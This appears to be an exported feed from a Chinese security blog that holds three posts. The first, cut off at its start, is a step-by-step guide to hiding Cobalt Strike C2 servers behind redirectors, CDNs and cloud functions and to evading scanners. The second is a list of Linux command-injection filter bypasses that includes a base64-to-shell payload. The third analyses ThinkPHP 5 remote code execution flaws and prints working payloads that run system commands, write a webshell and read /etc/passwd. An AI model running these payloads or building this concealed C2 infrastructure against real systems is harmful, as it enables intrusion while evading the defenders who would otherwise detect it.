bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请免费证书</span></span><br><span class="line">apt install certbot</span><br><span class="line">certbot certonly --standalone -d update.domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将证书打包并生成store文件</span></span><br><span class="line">openssl pkcs12 -<span class="built_in">export</span> -<span class="keyword">in</span> /etc/letsencrypt/live/update.domain.com/fullchain.pem -inkey /etc/letsencrypt/live/update.domain.com/privkey.pem -out update.domain.com.p12 -name update.domain.com -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore update.domain.com.store -srckeystore update.domain.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -<span class="built_in">alias</span> update.domain.com</span><br></pre></td></tr></table></figure><p>接下来就需要用到<a href="https://www.cobaltstrike.com/help-malleable-c2">Malleable C2 profile</a>来引入我们自己申请的证书。以<code>amazon.profile</code>为例，将刚才生成的store文件放到CS目录下，向<code>amazon.profile</code>文件追加证书配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">https-certificate &#123;</span></span><br><span class="line"><span class="string">    set keystore &quot;update.domain.com.store&quot;;</span></span><br><span class="line"><span class="string">    set password &quot;123456&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顺带把dns_idle和stager路径也改了</span></span><br><span class="line">sed -i <span class="string">&#x27;11i\set dns_idle &quot;8.8.8.8&quot;;&#x27;</span> amazon.profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">http-stager &#123;</span></span><br><span class="line"><span class="string">    set uri_x86 &quot;/jquery.min.js&quot;;</span></span><br><span class="line"><span class="string">    set uri_x64 &quot;/jquery.debug.js&quot;;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> &gt;&gt; amazon.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查配置文件有效性</span></span><br><span class="line">./c2lint amazon.profile</span><br></pre></td></tr></table></figure><p><img src="/img/jcyyccss_y.png"></p><p>再通过<code>nohup ./teamserver IP password amazon.profile &amp;</code>启动后抓上线包，证书就是自己申请的了</p><hr><p>经过以上修改后虽然起到了一定的伪装效果，但在投递Payload、Beacon监听、会话回连等过程中，马被杀被分析、Beacon的Listener被主动扫描、流量触发WAF/IDS规则都可能让C2服务器等基础设施难逃被标记的命运，这时我们可以拉一个靠山（云）或是临时工（VPS）顶在前面，使得CS服务器从风暴前线转移到相对安全的后方阵地。</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>就像nginx反向代理会隐藏后端的tomcat等应用服务器一样，我们可以开一个按时付费、随时能销毁的机器充当临时工，它作为一个中间人转发马和CS服务器相应端口的流量。但要注意的是需要给CS服务器所在机器加上白名单防火墙，只放行临时工机器的IP。</p><ul><li>当然也有个缺点就是CS操作界面的外部IP就都会是临时工的IP了，可以设置<code>trust_x_forwarded_for</code>头或通过目标向Log平台发起请求等方法获取真实IP</li></ul><p><img src="/img/jcyyccss_d.png"></p><p>图是CS手册里的，暂时不必搞这么多分工和分级，先搭建一个简单的<code>目标机器 &lt;-&gt; 临时工 &lt;-&gt; CS服务器</code>这种拓扑的环境。</p><p>I. 设置CS服务器所在机器的白名单防火墙</p><p><img src="/img/jcyyccss_e.png"></p><p>II. 在临时工机器上安装socat并进行端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install socat</span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 &amp;</span><br><span class="line">socat TCP4-LISTEN:443,fork TCP4:1.1.1.1:443 &amp;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可用 netstat -pantu | grep socat 查看后台转发的端口，kill PID 中止转发</span></span><br></pre></td></tr></table></figure><p>III. 创建CS的Listener，设置回连地址为临时工的IP</p><p><img src="/img/jcyyccss_f.png"></p><p>IV. 向目标投递马子并执行，然后坐等上线即可</p><ul><li>此外还有一些专门做转发比如微林之类的</li></ul><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>简单的CDN转发其实就是临时工角色从自己开的VPS变成了Cloudflare、XX云等厂商而已，只需要将域名ns记录给到对应的CDN厂商，之后马儿通过域名上线即可。注意一下CS服务器所在机器的防火墙白名单，要设置为CDN厂商的段（没有预设的话就自己搜集一下）。</p><p><img src="/img/jcyyccss_g.png"></p><p>这个的好处就是，相比自己开的临时工VPS依然可能被标记/被封，CDN厂商IP服务的站会很多，威胁情报要规避误报不太可能把CDN都拉黑。。。下面简述一下在freenom注册域名并且走Cloudflare CDN上线的流程。</p><p>I. 在freenom嫖一个免费域名，不用付费也规避了资金溯源</p><p>II. 将域名的NS记录设置为CF提供的</p><p><img src="/img/jcyyccss_h.png"></p><p>III. 等DNS缓存刷新后，通过域名上线即可</p><p><img src="/img/jcyyccss_i.png"></p><ul><li>要注意在<code>DNS-&gt;配置</code>中开启<code>开发模式</code>用来取消缓存（每次3小时），否则可能会只有心跳但执行不了命令。其次CloudFlare免费套餐限定了<a href="https://support.cloudflare.com/hc/en-us/articles/200169156-Identifying-network-ports-compatible-with-Cloudflare-s-proxy">http/https能用的端口</a></li></ul><h3 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h3><p>在介绍域前置是什么之前，我们先思考一个问题：CDN一个IP对应多个站点，它是怎么知道到底每个请求要回源到哪个站点的。答案就是根据HTTP的Host请求头来区分，举个例子：</p><ul><li>a.com 用了CDN 1.2.3.4</li><li>b.net 也用了CDN 1.2.3.4</li></ul><p>我们通过<code>curl -v &#39;a.com&#39; -H &#39;b.net&#39;</code>最终访问的也是<code>b.net</code>，因为<code>a.com</code>的DNS会解析到<code>1.2.3.4</code>，而CDN是根据Host来判断的。</p><p>因此就可以在CDN中配置回源IP为CS所在服务器，并将加速域名设置为 <code>在该CDN提供商这里尚未被占用的</code> 高可信白名单子域名（例如systemupdate.microsoft.com）</p><p>但是，真的是这样嘛？</p><p>放在以前，甚至半年前都是可行的。很多CDN提供商都不需要校验加速域名的所有权，或是如果回源IP为自家产品就不需要校验。但是现在以前常说的<code>CloudFront、Azure、CloudFlare、阿里云</code>等厂商都需要<a href="https://help.aliyun.com/document_detail/169377.html?spm=5176.11785003.overview.3.704c142fjv5nwd">验证域名归属权</a>了，需要向加速域名添加CNAME、TXT等记录来证明所有权，这样基本也就断了这条路子。</p><p>还有点小想法就是利用某些有子域控制权的服务、拿下一些软柿子DNS控制权、或者退而求其次注册些形如<code>mlcrosoft</code>的域名骗骗视力不好的管理员。</p><ul><li>也许还有不需要验证或是能Bypass的，只是笔者还没发现或是get到姿势</li></ul><h3 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h3><p>云函数简单的说就是云服务厂商已经搭建好了多种语言执行环境，我们只需要把代码通过Web传上去（或是在线编辑）就能执行。部署在云上自带CDN特效，只需要跑个转发代码就能被当作转发器用，即<code>目标机器 &lt;-&gt; 云函数CDN &lt;-&gt; CS服务器</code>。</p><p><img src="/img/jcyyccss_j.png"></p><p>各个厂商的云函数部署大同小异，具体方法可参考各家的文档。笔者特意测试了CS4.0是能正常上线并执行命令的，并不是一定得用CS4.1。除此之外中间其实踩了不少坑，挑几个可能比较普适的聊一下QAQ。</p><p><img src="/img/jcyyccss_k.png"></p><p>I. 首先编写转发代码时，URL后不要再加斜杠<code>/</code>了，不然到了CS那可能会成双斜杠<code>//</code>，转发的协议也要跟CS的Listener类型要对得上。比如位于<code>1.1.1.1</code>机器上的CS有一个https的Listener，那转发代码的URL就要写成<code>https://1.1.1.1</code></p><p>II. 为了用自己搞的HTTPS证书就会要套profile，如果在<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>的基础上改，一定要修改或是注释掉里面<code>header &quot;Host&quot;</code>部分。至于原因，想想之前介绍的CDN如何区分不同站点就明白了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/header &quot;Host&quot;/#header &quot;Host&quot;/g&#x27;</span> amazon.profile</span><br></pre></td></tr></table></figure><p>III. 云函数会有 前端/后端 请求超时时间，建议把这个秒数稍微调大点，不然stage的马可能来不及走完流程就被挂了。</p><p>IV. 需要启用集成响应，否则上线下发不了命令。</p><h2 id="stager"><a href="#stager" class="headerlink" title="stager"></a>stager</h2><p>CS的stage马上线时，默认会向一个符合checksum8规则的路径发起请求，随后服务器会响应各种Payload数据。checksum8规则路径大概就长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;x9cI&#x2F;</span><br><span class="line">&#x2F;fYKR&#x2F;</span><br><span class="line">&#x2F;Mrm0&#x2F;</span><br><span class="line">&#x2F;wQPD&#x2F;</span><br><span class="line">&#x2F;yDHX&#x2F;</span><br><span class="line">&#x2F;BCre&#x2F;</span><br><span class="line">&#x2F;WHVh&#x2F;</span><br></pre></td></tr></table></figure><p>在profile中配置<code>http-stager</code>可以改变stage马的默认请求路径：</p><p><img src="/img/jcyyccss_l.png"></p><p>但这并不会让之前的默认规则失效，此时通过checksum8规则路径依然是可以正常上线执行命令的。</p><p><img src="/img/jcyyccss_m.png"></p><p>我们在浏览器中手动访问该路径会下载一个文件，随后可以利用固定的抑或密钥将其解密看个光光。</p><p><img src="/img/jcyyccss_n.png"></p><p>解决这个问题最方便的办法就是用完就把stager给kill掉，用的时候再编辑下Listener并保存就会重新开起来。</p><p><img src="/img/jcyyccss_o.png"></p><p>比较一劳永逸的办法就是反编译出class修改抑或字节并重新加密替换回去。已经有师傅改好了现成的，不过<code>0x3e</code>这个抑或字节迟早也会被加入解密全家桶，所以还是得团队自己改好一个自用的并将知道密钥的人咩口（误。之后再用<code>grab_beacon_config.nse</code>脚本去扫描，因为抑或密钥变了自然也就解析不出了。</p><p><img src="/img/jcyyccss_p.png"></p><h2 id="JA3-S-amp-JARM"><a href="#JA3-S-amp-JARM" class="headerlink" title="JA3/S &amp; JARM"></a>JA3/S &amp; JARM</h2><p>这是一类根据Java版本、Web服务器、TLS版本等多因素TLS握手包生成指纹的方法，具体介绍及工具可参考<a href="https://github.com/salesforce/jarm">jarm</a>。</p><p>目前主要用于识别的CS的JARM指纹是<code>07d2ad16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1</code>，利用这个指纹去识别其实也会包含不少像Tomcat、Weblogic这类的JavaWeb服务器。且该指纹是基于JDK11，如果用JDK13去跑CS则会得到不一样的指纹。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据对CS服务器的识别方式，主要可以分为主动扫描和被动识别，同时对每种标记方法介绍了相应的隐藏方法。像端口转发、CDN这类方法其实也可以组合使用，不过从实测的速度来看效果会很不理想。除此以外还有一些小套路比如让上线用的域名泛解析到同行（逃，像CloudFlare这种免费套餐不允许设置泛解析的就多加几条记录。</p><p>对于防守方来说，除了利用上述方法去识别没捂严实的CS服务器，可以考虑利用checksum8规则的特点给CS服务器疯狂假上线干扰攻击队，或者直接给各大杀软和沙箱批量交样本:(</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/1349/">Cobalt Strike 绕过流量审计</a></p><p><a href="http://www.feidao.site/wordpress/?p=4457">CobaltStrike流量规避和cdn配置</a></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/108027233">使用CobaltStrike搭建域前置</a></p><p><a href="https://www.anquanke.com/post/id/195011">基于国内某云的 Domain Fronting 技术实践</a></p><p><a href="https://lmntrix.com/lab/lmntrix-labs-hiding-in-plain-sight-with-reflective-injection-and-domain-fronting/">Reflective Injection And Domain Fronting</a></p><p><a href="https://www.anquanke.com/post/id/224535">浅析CobaltStrike Beacon Staging Server扫描</a></p><p><a href="https://mp.weixin.qq.com/s/fhcTTWV4Ddz4h9KxHVRcnw">Bypass cobaltstrike beacon config scan</a></p><p><a href="https://sysopfb.github.io/malware,/cobaltstrike/2020/03/24/beacon-in-azure.html">Hiding in the clouds</a></p><p><a href="https://github.com/Sentinel-One/CobaltStrikeParser">CobaltStrikeParser</a></p><p><a href="https://mp.weixin.qq.com/s/hz9lZidZXgbPrkI32pCdVQ">关于CobaltStrike的Stager被扫问题</a></p><p><a href="https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/">Analyzing Cobalt Strike for Fun and Profit</a></p><p><a href="https://blog.cobaltstrike.com/2020/12/08/a-red-teamer-plays-with-jarm/">A Red Teamer Plays with JARM</a></p><p><a href="https://www.anquanke.com/post/id/225627">利用JARM指纹进行TLS服务端标记</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。&lt;/p&gt;
&lt;h2 id=&quot;默认端口&quot;&gt;&lt;a href=&quot;#默认端口&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="cs" scheme="https://hosch3n.github.io/tags/cs/"/>
    
    <category term="检测" scheme="https://hosch3n.github.io/tags/%E6%A3%80%E6%B5%8B/"/>
    
    <category term="伪装" scheme="https://hosch3n.github.io/tags/%E4%BC%AA%E8%A3%85/"/>
    
    <category term="端口" scheme="https://hosch3n.github.io/tags/%E7%AB%AF%E5%8F%A3/"/>
    
    <category term="tls" scheme="https://hosch3n.github.io/tags/tls/"/>
    
    <category term="cdn" scheme="https://hosch3n.github.io/tags/cdn/"/>
    
    <category term="stage" scheme="https://hosch3n.github.io/tags/stage/"/>
    
    <category term="ja3" scheme="https://hosch3n.github.io/tags/ja3/"/>
    
    <category term="jarm" scheme="https://hosch3n.github.io/tags/jarm/"/>
    
  </entry>
  
  <entry>
    <title>Linux命令注入Bypass过滤</title>
    <link href="https://hosch3n.github.io/2020/11/21/Linux%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E8%BF%87%E6%BB%A4/"/>
    <id>https://hosch3n.github.io/2020/11/21/Linux%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5Bypass%E8%BF%87%E6%BB%A4/</id>
    <published>2020-11-21T02:56:10.000Z</published>
    <updated>2021-01-17T05:44:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><code>$&#123;IFS&#125;</code>在<code>man bash</code>手册中有介绍。它是一个字符串类型的分隔符集合，顾名思义就是用来定义分隔符的内置变量。通过<code>echo -n &quot;$IFS&quot; | hexdump</code>可以看到十六进制编码后的内部值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$IFS</span>&quot;</span> | hexdump</span><br><span class="line">0000000 0920 000a                              </span><br><span class="line">0000003</span><br></pre></td></tr></table></figure><p>不同的Linux发行版略有差异，主要是<code>0x09（\t）</code>、<code>0x20（空格）</code>、<code>0x0a（\n）</code>这三个默认值顺序的不同。它们三兄弟虽然紧挨在一起，但都是单独地起作用（即没有用来分割分隔符的分隔符）。IFS的值与<code>$*</code>、<code>$@</code>等内置变量也关系密切，通过将IFS赋空（NULL）可以实现一些特殊效果。在绕过时可以配合<code>$9</code>这个特殊空字符串</p><ul><li>重定向符：<code>cat&lt;&gt;flag</code>、<code>cat&lt;flag</code></li></ul><h2 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h2><p>灵活运用<code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code>、<code>;</code>、<code>%0a（\n）</code>、<code>:</code>等符号</p><h2 id="过滤斜杠"><a href="#过滤斜杠" class="headerlink" title="过滤斜杠"></a>过滤斜杠</h2><p>用<code>cd</code>配合命令分隔符</p><p>通过grep递归查找：<code>grep -ri . flag</code></p><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><p>假设过滤<code>cat</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">`c<span class="string">&#x27;&#x27;</span>at`</span><br><span class="line"></span><br><span class="line">`c<span class="string">&quot;&quot;</span>at`</span><br><span class="line"></span><br><span class="line">```ca``t```</span><br><span class="line"></span><br><span class="line">`ca\t`</span><br><span class="line"></span><br><span class="line">`x=ca;y=t;<span class="variable">$x</span><span class="variable">$y</span>`</span><br><span class="line"></span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&#x27;Y2F0IGZsYWc=&#x27;</span>|base64 -d|sh`</span><br><span class="line"></span><br><span class="line">`bash -c <span class="string">&quot;&#123;echo, Y2F0IGZsYWc=&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 综合利用其它变量构造</span></span><br></pre></td></tr></table></figure><h2 id="无x权限的ELF"><a href="#无x权限的ELF" class="headerlink" title="无x权限的ELF"></a>无x权限的ELF</h2><p>利用动态加载器执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ldd readflag</span><br><span class="line"></span><br><span class="line">readelf -r readflag</span><br><span class="line"></span><br><span class="line">./lib64/ld-linux-x86-64.so.2 ./readflag</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;过滤空格&quot;&gt;&lt;a href=&quot;#过滤空格&quot; class=&quot;headerlink&quot; title=&quot;过滤空格&quot;&gt;&lt;/a&gt;过滤空格&lt;/h2&gt;&lt;p&gt;&lt;code&gt;$&amp;#123;IFS&amp;#125;&lt;/code&gt;在&lt;code&gt;man bash&lt;/code&gt;手册中有介绍。它是一个</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="linux" scheme="https://hosch3n.github.io/tags/linux/"/>
    
    <category term="bypass" scheme="https://hosch3n.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析代码执行篇</title>
    <link href="https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/11/05/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%AF%87/</id>
    <published>2020-11-05T11:51:12.000Z</published>
    <updated>2020-12-03T05:45:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>环境搭建基础可以参考SQL注入篇和官方文档</p><h2 id="代码执行1"><a href="#代码执行1" class="headerlink" title="代码执行1"></a>代码执行1</h2><p>通过传参可以调用任意类方法，调用一些具有回调功能的函数时可以导致代码执行。</p><p>影响版本：</p><ul><li>5.0.7&lt;=ThinkPHP&lt;=5.0.22</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.1</span><br><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line"></span><br><span class="line"># 5.0</span><br><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username             # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;runtime&#x2F;log&#x2F;202012&#x2F;02.log  # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php     # 包含任意.php文件</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.23</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">改进控制器获取</a>这个commit</p><p><img src="/img/tp5ldfxrce_a.png"></p><p>加了个限制大小写字母的过滤。从官方文档可以知道，获取控制器的方式取决于用的哪种路由模式，ThinkPHP默认无强制路由、支持兼容模式，SQL注入篇中都是用的<code>?s=/模块/控制器/方法</code>这种Payload，此处可以合理猜测能够调用到危险方法。</p><p>将源码更新为5.0.22，直接全局搜索<code>eval</code>、<code>assert</code>和<code>system</code>这类赤果果的关键词基本没得搞头，但是搜回调类、反射类的函数就会眼前一亮。</p><p><img src="/img/tp5ldfxrce_b.png"></p><p>以<code>reflect</code>为例搜到的App类（thinkphp/library/think/App.php）第一条结果就是一个静态<code>invokeFunction</code>方法，<code>invokeArgs</code>方法类似<code>call_user_func_array</code>函数，只要<code>$function</code>和<code>$args</code>可控就能实现控制任意函数和参数代码执行了。跟进<code>self::bindParams</code>方法可以看到它的作用就是获取传入的参数，通过完全限定名称的命名空间调用并无脑传参就行了。</p><p><img src="/img/tp5ldfxrce_d.png"></p><p>5.1版本的利用方法类似而且能利用的类比5.0更多，官方正则判断的修复方式就是卡了命名空间的逃逸。</p><ul><li><code>$_SERVER[&#39;PATH_INFO&#39;]</code>会将<code>\</code>转为<code>/</code></li></ul><h2 id="代码执行2"><a href="#代码执行2" class="headerlink" title="代码执行2"></a>代码执行2</h2><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.30</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">sss&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;route[]&#x3D;ls -al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"># 包含任意文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[REQUEST_METHOD]&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line"># 5.1.17 &lt;&#x3D; ThinkPHP5 &lt;&#x3D; 5.1.32 需要error_reporting(0);</span><br><span class="line">c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.24</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a>这个commit</p><p><img src="/img/tp5ldfxrce_e.png"></p><p>调用<code>Request</code>类方法前做了白名单判断，猜测漏洞可能是能调用当前类任意方法，找到<code>Config::get(&#39;var_method&#39;)</code>对应的值为<code>_method</code>。</p><p><img src="/img/tp5ldfxrce_f.png"></p><p>回顾一下SQL注入篇中说过<code>凡是使用框架提供的请求变量获取方法(Request类param方法及input助手函数)，都会经过这个filterExp方法的过滤</code>，其中的<code>filterExp</code>方法是被<code>filterValue</code>方法拉起调用的，而<code>filterValue</code>方法中就存在敏感函数<code>call_user_func</code>：</p><p><img src="/img/tp5ldfxrce_g.png"></p><p>全局搜索对应的<code>filterValue</code>方法，看到可以由824行的<code>cookie</code>方法或是由994行的<code>input</code>方法触发（但是似乎框架默认逻辑没有用到<code>cookie</code>方法）。</p><p><img src="/img/tp5ldfxrce_h.png"></p><p>跟进<code>getFilter</code>方法后看上去影响不大先不管，回来继续向上跟进<code>array_walk_recursive</code>函数传递的第一和第三个参数，进而寻找调用了<code>input</code>方法的地方（<code>-&gt;input\(|::input\(</code>）：</p><p><img src="/img/tp5ldfxrce_i.png"></p><p>这个构造函数简直来得不要太妙（是个伏笔2333）：如果当前类中的属性名有与<code>$options</code>数组中键名相同的，就会被覆盖为相应的键值，并且给<code>$this-&gt;input</code>属性赋值了完全可控的<code>php://input</code>。</p><p>有很多地方调用了<code>input</code>方法，先看下<code>Request</code>类的<code>param</code>方法：</p><p><img src="/img/tp5ldfxrce_j.png"></p><p>出现了被更新白名单的<code>method</code>方法，至此利用链的链尾已经基本清晰：</p><p>?-&gt;<code>param</code>-&gt;<code>method</code>、<code>input</code>-&gt;<code>filterValue</code>-&gt;<code>call_user_func</code></p><p>接下来需要思考如何通过<code>Request</code>类的某个方法修改默认为空的<code>$filter</code>的值呢？刚才那个构造函数刚好可以实现对<code>$this-&gt;filter</code>变量覆盖！也就是通过$_POST传入<code>_method=__construct&amp;filter[]=system</code>。搞定了一个参数，继续想办法搞定另外一个参数：</p><p><img src="/img/tp5ldfxrce_k.png"></p><p>继续通过变量覆盖控制<code>$this-&gt;get</code>或者<code>$this-&gt;route</code>的值，就能直接进到<code>input</code>方法中。也就是继续通过$_POST传入<code>&amp;get[]=whoami</code>或是<code>&amp;route[]=whoami</code>，此时如果<code>&#39;app_debug&#39; =&gt; true,</code>就可以直接看到命令执行结果：</p><p><img src="/img/tp5ldfxrce_l.png"></p><p>这也印证了此时的<code>param</code>方法确实被框架调用了，但是一旦关掉<code>app_debug</code>就会发现并不能RCE了 